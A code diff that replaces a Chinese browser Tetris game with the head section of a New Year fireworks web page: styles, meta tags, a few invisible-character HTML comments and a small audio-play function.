@@ -1,635 +1,1231 @@
-<!DOCTYPE html>
-<html>
-    <head>
-        <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
-        <title>网页版俄罗斯方块</title>
-        <style>
-        body,div,dl,dt,dd,ul,ol,li,h1,h2,h3,h4,h5,h6,pre,form,fieldset,input,button,textarea,p,blockquote,th,td
-        {
-            padding: 0;
+<!DOCTYPE html><html lang="en"><head><meta name="360-analysis-id" content="302u1c2z312u2q"><!--!‭‪‪‬‏‪‫‬‪‬‏‏‭‪‫‬‏‪‬‎‬--><meta charset="utf-8"><!--!‭‪‪‬‏‪‫‬‪‬‏‏‭‪‫‬‏‪‬‎‬--><meta name="360-analysis-id" content="2y352v1d1h361c2v"><!--!‭‪‪‬‏‪‫‬‪‬‏‏‭‪‫‬‏‪‬‎‬--><!--!‬‏‎‭‪‏‬‏‫‫‬‫‫‬‏‭‫‪‫‬‪‬‏‫--><!--!‬‏‎‭‪‏‬‏‫‫‬‫‫‬‏‭‫‪‫‬‪‬‏‫-->
+    
+    <title>💥新年快乐🎆</title>
+
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no"><!--!‭‪‪‬‏‪‫‬‪‬‏‏‭‪‫‬‏‪‬‎‬--><!--!‬‏‎‭‪‏‬‏‫‫‬‫‫‬‏‭‫‪‫‬‪‬‏‫-->
+    <meta name="mobile-web-app-capable" content="yes"><!--!‭‪‪‬‏‪‫‬‪‬‏‏‭‪‫‬‏‪‬‎‬--><!--!‬‏‎‭‪‏‬‏‫‫‬‫‫‬‏‭‫‪‫‬‪‬‏‫-->
+    <meta name="apple-mobile-web-app-capable" content="yes"><!--!‭‪‪‬‏‪‫‬‪‬‏‏‭‪‫‬‏‪‬‎‬--><!--!‬‏‎‭‪‏‬‏‫‫‬‫‫‬‏‭‫‪‫‬‪‬‏‫-->
+    <meta name="theme-color" content="#000000"><!--!‭‪‪‬‏‪‫‬‪‬‏‏‭‪‫‬‏‪‬‎‬--><!--!‬‏‎‭‪‏‬‏‫‫‬‫‫‬‏‭‫‪‫‬‪‬‏‫-->
+    <link rel="shortcut icon" type="image/png" href="https://s3-us-west-2.amazonaws.com/s.cdpn.io/329180/firework-burst-icon-v2.png">
+    <link rel="icon" type="image/png" href="https://s3-us-west-2.amazonaws.com/s.cdpn.io/329180/firework-burst-icon-v2.png">
+    <link rel="apple-touch-icon-precomposed" href="https://s3-us-west-2.amazonaws.com/s.cdpn.io/329180/firework-burst-icon-v2.png">
+    <meta name="msapplication-TileColor" content="#000000"><!--!‭‪‪‬‏‪‫‬‪‬‏‏‭‪‫‬‏‪‬‎‬--><!--!‬‏‎‭‪‏‬‏‫‫‬‫‫‬‏‭‫‪‫‬‪‬‏‫-->
+    <meta name="msapplication-TileImage" content="https://s3-us-west-2.amazonaws.com/s.cdpn.io/329180/firework-burst-icon-v2.png"><!--!‭‪‪‬‏‪‫‬‪‬‏‏‭‪‫‬‏‪‬‎‬--><!--!‬‏‎‭‪‏‬‏‫‫‬‫‫‬‏‭‫‪‫‬‪‬‏‫-->
+    <style>
+        * {
             margin: 0;
+            padding: 0;
+            border: 0;
+            font-size: 100%;
+            font: inherit;
+            vertical-align: baseline;
+            user-select: none;
+        }
+
+        article,
+        aside,
+        details,
+        figcaption,
+        figure,
+        footer,
+        header,
+        hgroup,
+        menu,
+        nav,
+        section {
+            display: block
         }
 
         body {
-            font-family: "Helvetica Neue", "Hiragino Sans GB", "Segoe UI",
-                "Microsoft Yahei", "微软雅黑", Tahoma, Arial, STHeiti, sans-serif;
-            font-size: 12px;
-            background: #fff;
-            color: #333;
+            line-height: 1
         }
 
-        a{
-            outline:none;
-            -moz-outline:none;
-            text-decoration: none;
+        ol,
+        ul {
+            list-style: none
         }
 
-        .wrap{
-            width:1000px;
-            margin:80px auto;
+        blockquote,
+        q {
+            quotes: none
         }
 
-        .play_wrap{
-            padding-left:260px;
+        blockquote:before,
+        blockquote:after,
+        q:before,
+        q:after {
+            content: '';
+            content: none
         }
 
-        #play_area{
-            float:left;
-            width:300px;
-            height:480px;
-            margin:auto;
-            background-color:#fefefe;
-            border-radius:2px;
-            color:black;
-            box-shadow:0px 0px 8px #e5e5e5;
-            padding:1px 0 0 1px;
+        table {
+            border-collapse: collapse;
+            border-spacing: 0
         }
 
-        #play_area .play_cell{
-            float:left;
-            width:19px;
-            height:19px;
-            border:1px solid #eee;
-            margin:-1px 0 0 -1px;
+        * {
+            position: relative;
+            box-sizing: border-box;
         }
 
-        #play_area .play_cell.active{
-            background:#999;
-            border:1px solid #ccc;
+        html,
+        body {
+            height: 100%;
         }
 
-        #play_area .play_cell.goal{
-            background:#0c0;
+        html {
+            background-color: #000;
         }
 
-        .play_menu{
-            float:left;
-            margin-left:60px;
-            font-size:14px;
-            padding-top:20px;
-        }
-
-        .play_menu #play_nextType{
-            width:60px;
-            height:60px;
-            padding:1px 0 0 1px;
-            margin:10px 0 20px 0;
-        }
-
-        .play_menu .play_mini_cell{
-            float:left;
-            width:14px;
-            height:14px;
-            border:1px solid #fff;
-            margin:-1px 0 0 -1px;
-        }
-
-        .play_menu .play_mini_cell.active{
-            background:#999;
-            border:1px solid #ccc;
-        }
-
-        .play_menu p {
-            line-height:200%;
-            clear:both;
-        }
-
-        .play_menu a.play_btn{
-            display:block;
-            margin-bottom:20px;
-            width:80px;
-            height:28px;
-            line-height:28px;
-            text-align:center;
-            text-decoration: none;
-            color:#333;
-            background:#fefefe;
-            border:1px solid #eee;
-            border-radius: 2px;
-            box-shadow: 1px 1px 2px #eee;
-            border-color:#ddd #d2d2d2 #d2d2d2 #ddd;
-            outline: none;
-            -moz-outline:none;
-        }
-
-        .play_menu a.play_btn:hover{
-            background-color:#fcfcfc;
-            border-color:#ccc;
-            box-shadow: inset 0 -2px 6px #eee;
-        }
-
-        .play_menu a#play_btn_level{
-            position:relative;
-            margin-bottom:30px;
-        }
-
-        .level_text{
-            margin-left:-10px;
-        }
-
-        .level_icon{
-            display: block;
-            position:absolute;
-            top:12px;
-            right:16px;
-            width:0;
-            height:0;
+        body {
             overflow: hidden;
-            border:5px solid #FFF;
-            border-color: #999 transparent transparent transparent;
+            color: rgba(255, 255, 255, 0.5);
+            font-family: "Russo One", arial, sans-serif;
+            line-height: 1.25;
+            letter-spacing: 0.06em;
         }
 
-        .level_menu{
-            position:absolute;
-            margin:-30px 0 0 1px;
-            display:none;
+        .hide {
+            opacity: 0;
+            visibility: hidden;
         }
-        .level_menu ul{
-            list-style:none;
-        }
-        .level_menu li{
-            float:left;
-        }
-        .level_menu li a{
-            display:block;
-            padding:3px 10px;
-            border:1px solid #e8e8e8;
-            margin-left:-1px;
-            color:#09c;
-        }
-        .level_menu li a:hover{
-            background:#09c;
-            color:#fefefe;
-        }
-        </style>
-        <script type="text/javascript" src="jquery-1.6.2.min.js"></script>
-        <script type="text/javascript">
-        var Tetris = function(options){
-            //方块区域
-            this.e_playArea = $("#play_area");
-            //开始按钮
-            this.e_startBtn = $("#play_btn_start");
-            //分数
-            this.e_playScore = $("#play_score");
-            //方向
-            this.e_playDirection = $("#play_direction");
-            //等级按钮
-            this.e_levelBtn = $("#play_btn_level");
-            //等级菜单
-            this.e_levelMenu = $("#play_menu_level");
-            //下一个方块的类型
-            this.e_nextType = $("#play_nextType");
-            //总的列数
-            this.cellCol = 15;
-            //总的行数
-            this.cellRow = 24;
-            //每个小方块的属性数组
-            this.cellArr = [];
-            //保存右上方下一个那里的小图形数组
-            this.miniCellArr = [];
-            //分数
-            this.score = 0;
-            //方向
-            this.direction = "bottom";
-            //定时器的ID
-            this.timer = null;
-            //定时器的时间数组
-            this.interval = [600,300,100];
-            //等级的分数数组
-            this.levelScore = [10,20,40];
-            //消除的行数多少而给的倍数
-            this.doubleScore = [1,4,10,20];
-            //默认等级1
-            this.level = 1;
-            //游戏是否进行
-            this.playing = false;
-            //游戏暂停标记
-            this.turning = false;
-            //游戏结束标记
-            this.death = false;
-            //一开始方块列出现的位置
-            this.offsetCol = Math.floor(this.cellCol/2);
-            //一开始方块行出现的位置
-            this.offsetRow = -3;
 
-            this.tetrisArr = [];
-            /*
-                0,1,15,16
-                0,1,15,16
-             */
-            this.tetrisArr[0] = [
-                [0,1,this.cellCol,this.cellCol+1],
-                [0,1,this.cellCol,this.cellCol+1]
-            ];
-            /*
-                1,14,15,16
-                0,15,30,31
-                14,15,16,29
-                -1,0,15,30
-             */
-            this.tetrisArr[1] = [
-                [1,this.cellCol-1,this.cellCol,this.cellCol+1],
-                [0,this.cellCol,this.cellCol*2,this.cellCol*2+1],
-                [this.cellCol-1,this.cellCol,this.cellCol+1,this.cellCol*2-1],
-                [-1,0,this.cellCol,this.cellCol*2]
-            ];
-            /*
-                -1,14,15,16
-                0,1,15,30
-                14,15,16,31
-                0,15,29,30
-             */
-            this.tetrisArr[2] = [
-                [-1,this.cellCol-1,this.cellCol,this.cellCol+1],
-                [0,1,this.cellCol,this.cellCol*2],
-                [this.cellCol-1,this.cellCol,this.cellCol+1,this.cellCol*2+1],
-                [0,this.cellCol,this.cellCol*2-1,this.cellCol*2]
-            ];
-            /*
-                0,15,16,31
-                15,16,29,30
-             */
-            this.tetrisArr[3] = [
-                [0,this.cellCol,this.cellCol+1,this.cellCol*2+1],
-                [this.cellCol,this.cellCol+1,this.cellCol*2-1,this.cellCol*2]
-            ];
-            /*
-                0,14,15,29
-                14,15,30,31
-             */
-            this.tetrisArr[4] = [
-                [0,this.cellCol-1,this.cellCol,this.cellCol*2-1],
-                [this.cellCol-1,this.cellCol,this.cellCol*2,this.cellCol*2+1]
-            ];
-            /*
-                0,14,15,16
-                0,15,16,30
-                14,15,16,30
-                0,14,15,30
-             */
-            this.tetrisArr[5] = [
-                [0,this.cellCol-1,this.cellCol,this.cellCol+1],
-                [0,this.cellCol,this.cellCol+1,this.cellCol*2],
-                [this.cellCol-1,this.cellCol,this.cellCol+1,this.cellCol*2],
-                [0,this.cellCol-1,this.cellCol,this.cellCol*2]
-            ];
-            /*
-                0,15,30,45
-                14,15,16,17
-             */
-            this.tetrisArr[6] = [
-                [0,this.cellCol,this.cellCol*2,this.cellCol*3],
-                [this.cellCol-1,this.cellCol,this.cellCol+1,this.cellCol+2]
-            ];
-            this.tetrisType = [1,1];
-            this.tetrisType = [1,0];
-            this.tetrisTypeArr = [];
-
-            this.preTetris = [];
-            this.thisTetris = [];
-            this.fullArr = [];
-
-            this.start();
+        .remove {
+            display: none !important;
         }
-        Tetris.prototype = {
-            //开始入口函数
-            start : function(){
-                this.init();
-                this.menu();
-                this.control();
-            },
-            //选择设置
-            setOptions : function(options){
-                this.score = options.score === 0 ? options.score
-                        : (options.score || this.score);
-                this.level = options.level === 0 ? options.level
-                        : (options.level || this.level);
-            },
-            resetArea : function(){
-                $(".play_cell.active").removeClass("active");
-                this.setOptions({
-                    "score" : 0
-                });
-                this.e.playScore.html(this.score);
-            },
-            //菜单
-            menu : function(){
-                var self = this;
-                this.e_startBtn.click(function(){
-                    self.e_levelMenu.hide();
-                    if(self.playing){
-                        self.pause();
-                    } else if(self.death){
-                        self.resetArea();
-                        self.play();
-                    } else {
-                        self.play();
-                    }
-                });
-                this.e_levelBtn.click(function(){
-                    if(self.playing)return;
-                    self.e_levelMenu.toggle();
-                });
-                this.e_levelMenu.find("a").click(function(){
-                    self.e_levelMenu.hide();
-                    self.e_levelBtn.find(".level_text").html($(this).html());
-                    self.setOptions({
-                        "level" : $(this).attr("level")
-                    });
-                });
-            },
-            play : function(){
-                var self = this;
-                this.e_startBtn.html("暂停");
-                this.playing = true;
-                this.death = false;
-                if(this.turning){
-                    this.timer = setInterval(function(){
-                        self.offsetRow++;
-                        self.showTetris();
-                    },this.interval[this.level]);
-                } else {
-                    this.nextTetris();
-                }
-            },
-            pause : function(){
-                this.e_startBtn.html("开始");
-                this.playing = false;
-                clearTimeout(this.timer);
-            },
-            //初始化游戏
-            init : function(){
-                var self =this,_ele,_miniEle,_arr = [];
-                //创建小方块放进cellArr里
-                for(var i=0;i<this.cellCol;++i){
-                    for(var j=0;j<this.cellRow;++j){
-                        _ele = document.createElement("div");
-                        _ele.className = "play_cell";
-                        _ele.id = "play_cell_"+ i + "_" + j;
-                        this.cellArr.push($(_ele));
-                        this.e_playArea.append(_ele);
-                    }
-                }
-                //创建下一个图形的小方块
-                for(var m=0;m<16;++m){
-                    _miniEle = document.createElement("div");
-                    _miniEle.className = "play_mini_cell";
-                    this.miniCellArr.push($(_miniEle));
-                    this.e_nextType.append(_miniEle);
-                }
-                //保存三维数组tetrisArr的前两维数据编号，k为其第一维编号，j为其二维
-                for(var k=0,klen=this.tetrisArr.length;k<klen;++k){
-                    for(var j=0,jlen=this.tetrisArr[k].length;j<jlen;++j){
-                        this.tetrisTypeArr.push([k,j]);
-                    }
-                }
-                //下一个图形的【x】【y】
-                this.nextType = this.tetrisTypeArr[Math.floor(this.tetrisTypeArr.length*Math.random())];
-                this.showNextType();
-            },
-            //按键控制函数
-            control : function(){
-                var self = this;
-                $("html").keydown(function(e){
-                    if(!self.playing)
-                        return !self.playing;
-                    switch(e.keyCode){
-                        case 37:
-                        self.direction = "left";
-                        break;
-                        case 38:
-                        self.direction = "top";
-                        break;
-                        case 39:
-                        self.direction = "right";
-                        break;
-                        case 40:
-                        self.direction = "bottom";
-                        break;
-                        default:
-                        return;
-                        break;
-                    }
-                    //显示当前的按键操作
-                    self.e_playDirection.html(self.direction);
-                    //实行按键的操作函数
-                    self.drive();
-                    return false;
-                });
-            },
-            //改变图形的状态
-            changTetris : function(){
-                var _len = this.tetrisArr[this.tetrisType[0]].length;
-                if(this.tetrisType[1] < _len-1){
-                    this.tetrisType[1]++;
-                } else {
-                    this.tetrisType[1] = 0;
-                }
-            },
-            //按键的操作函数
-            drive : function(){
-                switch(this.direction){
-                    case "left":
-                    if(this.offsetCol>0){
-                        this.offsetCol--;
-                    }
-                    break;
-                    case "top":
-                    this.changTetris();
-                    break;
-                    case "right":
-                    this.offsetCol++;
-                    break;
-                    case "bottom":
-                    if(this.offsetRow<this.cellRow-2){
-                        this.offsetRow++;
-                    }
-                    break;
-                    default:
-                    break;
-                }
-                //显示图形的函数
-                this.showTetris(this.direction);
-            },
-            //显示图形的函数
-            showTetris : function(dir){
-                var _tt = this.tetrisArr[this.tetrisType[0]][this.tetrisType[1]],_ele,self=this;
-                this.turning = true;
-                this.thisTetris = [];
-                for(var i=_tt.length-1;i>=0;--i){
-                    _ele = this.cellArr[_tt[i]+this.offsetCol+this.offsetRow*this.cellCol];
-                    //规定左右移动不能超出边框
-                    if(this.offsetCol<7&&(_tt[i]+this.offsetCol+1)%this.cellCol==0){
-                        this.offsetCol++;
-                        return;
-                    }else if(this.offsetCol>7&&(_tt[i]+this.offsetCol)%this.cellCol==0){
-                        this.offsetCol--;
-                        return;
-                    }
-                    
-                    if(_ele&&_ele.hasClass("active")&&dir=="left"&&($.inArray(_ele,this.preTetris)<0)){
-                        if(($.inArray(_ele,this.cellArr)-$.inArray(this.preTetris[i],this.cellArr))%this.cellCol!=0){
-                            this.offsetCol++;
-                            return;
-                        }
-                    }
-                    if(_ele&&_ele.hasClass("active")&&dir=="right"&&($.inArray(_ele,this.preTetris)<0)){
-                        if(($.inArray(_ele,this.cellArr)-$.inArray(this.preTetris[i],this.cellArr))%this.cellCol!=0){
-                            this.offsetCol--;
-                            return;
-                        }
-                    }
-                    //找到某个div进行下落的过程
-                    //否则找不到直接结束下落的过程
-                    if(_ele){
-                        //找到一个div有class=active，而且不是上一次自身的位置，那么就停止
-                        //向下走了，因为遇到障碍物了
-                        //否则这个div符合，存起来
-                        if(_ele.hasClass("active")&&($.inArray(_ele,this.preTetris)<0)){
-                            this.tetrisDown();
-                            return;
-                        } else {
-                            this.thisTetris.push(_ele);
-                        }
-                    } else if(this.offsetRow>0){
-                        this.tetrisDown();
-                        return;
-                    }
-                }
-                //将上一次的位置的标记全部去除
-                for(var j=0,jlen=this.preTetris.length;j<jlen;++j){
-                    this.preTetris[j].removeClass("active");
-                }
-                //标记这一次的位置
-                for(var k=0,klen=this.thisTetris.length;k<klen;k++){
-                    this.thisTetris[k].addClass("active");
-                }
-                //储存起现在的位置，会成为下一次的前一次位置
-                this.preTetris = this.thisTetris.slice(0);
-            },
-            //无法下落时进行的函数
-            tetrisDown : function(){
-                clearInterval(this.timer);
-                var _index;
-                this.turning = false;
-                //是否填充满一行的检测
-                forOuter:for(var j=0,jlen=this.preTetris.length;j<jlen;++j){
-                    _index = $.inArray(this.preTetris[j],this.cellArr);
-                    for(var k=_index-_index%this.cellCol,klen=_index-_index%this.cellCol+this.cellCol;k<klen;++k){
-                        if(!this.cellArr[k].hasClass("active")){
-                            continue forOuter;
-                        }
-                    }
-                    if($.inArray(_index-_index%this.cellCol,this.fullArr)<0)
-                        this.fullArr.push(_index-_index%this.cellCol);
-                }
-                if(this.fullArr.length){
-                    this.getScore();
-                    return;
-                }
-                //如果图形在6-9的div内被标记，那么游戏结束
-                for(var i=6;i<9;++i){
-                    if(this.cellArr[i].hasClass("active")){
-                        this.gameOver();
-                        alert("you lost!");
-                        return;
-                    }
-                }
-                this.nextTetris();
-            },
-            //下一个图形
-            nextTetris : function(){
-                var self = this;
-                clearInterval(this.timer);
-                this.preTetris = [];
-                this.offsetRow = -2;
-                this.offsetCol = 7;
-                this.tetrisType = this.nextType;
-                this.nextType = this.tetrisTypeArr[Math.floor(this.tetrisTypeArr.length*Math.random())];
-                this.showNextType();
-                this.timer = setInterval(function(){
-                    self.offsetRow++;
-                    self.showTetris();
-                },this.interval[this.level]);
-            },
-            showNextType : function(){
-                //_nt为找到在this.nextType[0]行，this.nextType[1]列的一行数据
-                var _nt = this.tetrisArr[this.nextType[0]][this.nextType[1]],_ele,_index;
-                //找到class=active的元素，之后全部删除class元素
-                this.e_nextType.find(".active").removeClass("active");
-                for(var i=0,ilen=_nt.length;i<ilen;++i){
-                    if(_nt[i]>this.cellCol-2){
-                        _index = (_nt[i]+2)%this.cellCol-1+4*parseInt((_nt[i]+2)/this.cellCol);
-                    }else{
-                        _index = _nt[i] + 1;
-                    }
-                    _ele = this.miniCellArr[_index];
-                    _ele.addClass("active");
-                }
-            },
-            //获取分数
-            getScore : function(){
-                var self = this;
-                //对完整的行消除，对元素进行向下移动
-                for(var i=this.fullArr.length-1;i>=0;--i){
-                    for(var j=0;j<this.cellCol;++j){
-                        this.cellArr[j+this.fullArr[i]].removeClass("active");
-                        if(j==this.cellCol-1){
-                            for(var k=this.fullArr[i];k>=0;--k){
-                                if(this.cellArr[k].hasClass("active")){
-                                    this.cellArr[k].removeClass("active");
-                                    this.cellArr[k+this.cellCol].addClass("active");
-                                }
-                            }
-                        }
-                    }
-                }
-                this.score += this.levelScore[this.level]*this.doubleScore[this.fullArr.length-1];
-                this.e_playScore.html(this.score);
-                this.fullArr = [];
-                this.nextTetris();
-            },
-            //游戏结束
-            gameOver : function(){
-                this.death = true;
-                this.pause();
-                return;
+
+        .blur {
+            -webkit-filter: blur(12px);
+            filter: blur(12px);
+        }
+
+        .container {
+            height: 100%;
+            display: -webkit-box;
+            display: flex;
+            -webkit-box-pack: center;
+            justify-content: center;
+            -webkit-box-align: center;
+            align-items: center;
+        }
+
+        .loading-init {
+            width: 100%;
+            align-self: center;
+            text-align: center;
+            text-transform: uppercase;
+        }
+
+        .loading-init__header {
+            font-size: 2.2em;
+        }
+
+        .loading-init__status {
+            margin-top: 1em;
+            font-size: 0.8em;
+            opacity: 0.75;
+        }
+
+        .stage-container {
+            overflow: hidden;
+            box-sizing: initial;
+            border: 1px solid #222;
+            margin: -1px;
+        }
+
+        @media (max-width: 840px) {
+            .stage-container {
+                border: none;
+                margin: 0;
+            }
+        }
+
+        .canvas-container {
+            width: 100%;
+            height: 100%;
+            -webkit-transition: -webkit-filter 0.3s;
+            transition: -webkit-filter 0.3s;
+            transition: filter 0.3s;
+            transition: filter 0.3s, -webkit-filter 0.3s;
+        }
+
+        .canvas-container canvas {
+            position: absolute;
+            mix-blend-mode: lighten;
+            -webkit-transform: translateZ(0);
+            transform: translateZ(0);
+        }
+
+        .controls {
+            /* display: none !important; */
+            position: absolute;
+            top: 0;
+            width: 100%;
+            padding-bottom: 50px;
+            display: -webkit-box;
+            display: flex;
+            -webkit-box-pack: justify;
+            justify-content: space-between;
+            -webkit-transition: opacity 0.3s, visibility 0.3s;
+            transition: opacity 0.3s, visibility 0.3s;
+        }
+
+        @media (min-width: 840px) {
+            .controls {
+                visibility: visible;
+            }
+
+            .controls.hide:hover {
+                opacity: 1;
+            }
+        }
+
+        .menu {
+            display: none;
+            position: absolute;
+            top: 0;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            background-color: rgba(0, 0, 0, 0.42);
+            -webkit-transition: opacity 0.3s, visibility 0.3s;
+            transition: opacity 0.3s, visibility 0.3s;
+        }
+
+        .menu__inner-wrap {
+            display: -webkit-box;
+            display: flex;
+            -webkit-box-orient: vertical;
+            -webkit-box-direction: normal;
+            flex-direction: column;
+            -webkit-box-pack: center;
+            justify-content: center;
+            -webkit-box-align: center;
+            align-items: center;
+            position: absolute;
+            top: 0;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            -webkit-transition: opacity 0.3s;
+            transition: opacity 0.3s;
+        }
+
+        .menu__header {
+            margin-top: auto;
+            margin-bottom: 8px;
+            padding-top: 16px;
+            font-size: 2em;
+            text-transform: uppercase;
+        }
+
+        .menu__subheader {
+            margin-bottom: auto;
+            padding-bottom: 12px;
+            font-size: 0.86em;
+            opacity: 0.8;
+        }
+
+        .menu form {
+            width: 100%;
+            max-width: 400px;
+            padding: 0 10px;
+            overflow: auto;
+            -webkit-overflow-scrolling: touch;
+        }
+
+        .menu .form-option {
+            display: -webkit-box;
+            display: flex;
+            -webkit-box-align: center;
+            align-items: center;
+            margin: 16px 0;
+            -webkit-transition: opacity 0.3s;
+            transition: opacity 0.3s;
+        }
+
+        .menu .form-option label {
+            display: block;
+            width: 50%;
+            padding-right: 12px;
+            text-align: right;
+            text-transform: uppercase;
+            -webkit-user-select: none;
+            -moz-user-select: none;
+            -ms-user-select: none;
+            user-select: none;
+        }
+
+        .menu .form-option--select select {
+            display: block;
+            width: 50%;
+            height: 30px;
+            font-size: 1rem;
+            font-family: "Russo One", arial, sans-serif;
+            color: rgba(255, 255, 255, 0.5);
+            letter-spacing: 0.06em;
+            background-color: transparent;
+            border: 1px solid rgba(255, 255, 255, 0.5);
+        }
+
+        .menu .form-option--select select option {
+            background-color: black;
+        }
+
+        .menu .form-option--checkbox input {
+            display: block;
+            width: 26px;
+            height: 26px;
+            margin: 0;
+            opacity: 0.5;
+        }
+
+        @media (max-width: 840px) {
+
+            .menu .form-option select,
+            .menu .form-option input {
+                outline: none;
+            }
+        }
+
+        .close-menu-btn {
+            position: absolute;
+            top: 0;
+            right: 0;
+        }
+
+        .btn {
+            display: none;
+            opacity: 0.16;
+            width: 50px;
+            height: 50px;
+            display: -webkit-box;
+            display: flex;
+            -webkit-user-select: none;
+            -moz-user-select: none;
+            -ms-user-select: none;
+            user-select: none;
+            cursor: default;
+            -webkit-transition: opacity 0.3s;
+            transition: opacity 0.3s;
+        }
+
+        .btn--bright {
+            opacity: 0.5;
+        }
+
+        @media (min-width: 840px) {
+            .btn:hover {
+                opacity: 0.32;
+            }
+
+            .btn--bright:hover {
+                opacity: 0.75;
+            }
+        }
+
+        .btn svg {
+            display: block;
+            margin: auto;
+        }
+
+        .credits {
+            margin-top: auto;
+            margin-bottom: 10px;
+            padding-top: 6px;
+            font-size: 0.8em;
+            opacity: 0.75;
+        }
+
+        .credits a {
+            color: rgba(255, 255, 255, 0.5);
+            text-decoration: none;
+        }
+
+        .credits a:hover,
+        .credits a:active {
+            color: rgba(255, 255, 255, 0.75);
+            text-decoration: underline;
+        }
+
+        .help-modal {
+            display: -webkit-box;
+            display: flex;
+            -webkit-box-pack: center;
+            justify-content: center;
+            -webkit-box-align: center;
+            align-items: center;
+            position: fixed;
+            top: 0;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            visibility: hidden;
+            -webkit-transition-property: visibility;
+            transition-property: visibility;
+            -webkit-transition-duration: 0.25s;
+            transition-duration: 0.25s;
+        }
+
+        .help-modal__overlay {
+            position: absolute;
+            top: 0;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            opacity: 0;
+            -webkit-transition-property: opacity;
+            transition-property: opacity;
+            -webkit-transition-timing-function: ease-in;
+            transition-timing-function: ease-in;
+            -webkit-transition-duration: 0.25s;
+            transition-duration: 0.25s;
+        }
+
+        .help-modal__dialog {
+            display: -webkit-box;
+            display: flex;
+            -webkit-box-orient: vertical;
+            -webkit-box-direction: normal;
+            flex-direction: column;
+            -webkit-box-align: center;
+            align-items: center;
+            max-width: 400px;
+            max-height: calc(100vh - 100px);
+            margin: 10px;
+            padding: 20px;
+            border-radius: 0.3em;
+            background-color: rgba(0, 0, 0, 0.4);
+            opacity: 0;
+            -webkit-transform: scale(0.9, 0.9);
+            transform: scale(0.9, 0.9);
+            -webkit-transition-property: opacity, -webkit-transform;
+            transition-property: opacity, -webkit-transform;
+            transition-property: opacity, transform;
+            transition-property: opacity, transform, -webkit-transform;
+            -webkit-transition-timing-function: ease-in;
+            transition-timing-function: ease-in;
+            -webkit-transition-duration: 0.25s;
+            transition-duration: 0.25s;
+        }
+
+        @media (min-width: 840px) {
+            .help-modal__dialog {
+                font-size: 1.25rem;
+                max-width: 500px;
+            }
+        }
+
+        .help-modal__header {
+            font-size: 1.75em;
+            text-transform: uppercase;
+            text-align: center;
+        }
+
+        .help-modal__body {
+            overflow-y: auto;
+            -webkit-overflow-scrolling: touch;
+            margin: 1em 0;
+            padding: 1em 0;
+            border-top: 1px solid rgba(255, 255, 255, 0.25);
+            border-bottom: 1px solid rgba(255, 255, 255, 0.25);
+            line-height: 1.5;
+            color: rgba(255, 255, 255, 0.75);
+        }
+
+        .help-modal__close-btn {
+            flex-shrink: 0;
+            outline: none;
+            border: none;
+            border-radius: 2px;
+            padding: 0.25em 0.75em;
+            margin-top: 0.36em;
+            font-family: "Russo One", arial, sans-serif;
+            font-size: 1em;
+            color: rgba(255, 255, 255, 0.5);
+            text-transform: uppercase;
+            letter-spacing: 0.06em;
+            background-color: rgba(255, 255, 255, 0.25);
+            -webkit-transition: color 0.3s, background-color 0.3s;
+            transition: color 0.3s, background-color 0.3s;
+        }
+
+        .help-modal__close-btn:hover,
+        .help-modal__close-btn:active,
+        .help-modal__close-btn:focus {
+            color: #FFF;
+            background-color: #09F;
+        }
+
+        .help-modal.active {
+            visibility: visible;
+            -webkit-transition-duration: 0.4s;
+            transition-duration: 0.4s;
+        }
+
+        .help-modal.active .help-modal__overlay {
+            opacity: 1;
+            -webkit-transition-timing-function: ease-out;
+            transition-timing-function: ease-out;
+            -webkit-transition-duration: 0.4s;
+            transition-duration: 0.4s;
+        }
+
+        .help-modal.active .help-modal__dialog {
+            opacity: 1;
+            -webkit-transform: scale(1, 1);
+            transform: scale(1, 1);
+            -webkit-transition-timing-function: ease-out;
+            transition-timing-function: ease-out;
+            -webkit-transition-duration: 0.4s;
+            transition-duration: 0.4s;
+        }
+
+        .hide {
+            display: none !important;
+        }
+
+        .type_words {
+            padding: 60px 80px 20px 0px;
+            position: absolute;
+            top: 0px;
+            left: 10px;
+            z-index: 500;
+            color: #ffffff;
+            font-size: 14px;
+        }
+
+        #wish_text {
+            z-index: 19000;
+            width: 100%;
+            height: 120px;
+            font-size: 3em;
+            text-align: center;
+            font-family: “Arial”,“Microsoft YaHei”,“黑体”,“宋体”,sans-serif;
+            -webkit-text-stroke: 1px #fed71a;
+            color: transparent;
+            /* color: #fed71a; */
+            text-shadow:2px 2px 8px #FF0000;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+        }
+
+        .wish_text {
+            animation: wish 3s infinite;
+        }
+
+        @keyframes wish {
+            0% {
+                opacity: 0;
+            }
+
+            70% {
+                font-size: 3.5em;
+                opacity: 1;
+            }
+
+            80% {
+                font-size: 3.5em;
+                opacity: 1;
+            }
+
+            100% {
+                opacity: 0;
+            }
+        }
+    </style><!--!‭‪‪‬‏‪‫‬‪‬‏‏‭‪‫‬‏‪‬‎‬--><!--!‬‏‎‭‪‏‬‏‫‫‬‫‫‬‏‭‫‪‫‬‪‬‏‫-->
+    <script src="js/jquery.min.js" type="text/javascript"></script><!--!‭‪‪‬‏‪‫‬‪‬‏‏‭‪‫‬‏‪‬‎‬--><!--!‬‏‎‭‪‏‬‏‫‫‬‫‫‬‏‭‫‪‫‬‪‬‏‫-->
+    <script>
+        var shouci = true;
+        console.log(shouci);
+        function bodyPlayMusic() {
+            if (shouci) {
+                shouci = false;
+                audio.play();
+                console.log(shouci);
             }
         };
-        $(document).ready(function(e){
-            var t = new Tetris();
-        });
-        </script>
-    </head>
-    <body>
-        <div class="wrap">
-            <div class="play_wrap">
-                <div id="play_area"></div>
-                <div class="play_menu">
-                    <p>下一个：</p>
-                    <div id="play_nextType"></div>
-                    <a id="play_btn_start" class="play_btn" href="javascript:void(0);"
-                    unselectable="on">开始</a><a id="play_btn_level" class="play_btn" href="javascript:void(0)" unselectable="on"><span class="level_text">中等</span class="level_icon"></span></a>
-                    <div class="level_menu" id="play_menu_level">
-                        <ul>
-                            <li><a href="javascript:void(0)" level=0>简单</a></li>
-                            <li><a href="javascript:void(0)" level=1>中等</a></li>
-                            <li><a href="javascript:void(0)" level=2>困难</a></li>
-                        </ul>
+
+    </script><!--!‭‪‪‬‏‪‫‬‪‬‏‏‭‪‫‬‏‪‬‎‬--><!--!‬‏‎‭‪‏‬‏‫‫‬‫‫‬‏‭‫‪‫‬‪‬‏‫-->
+</head>
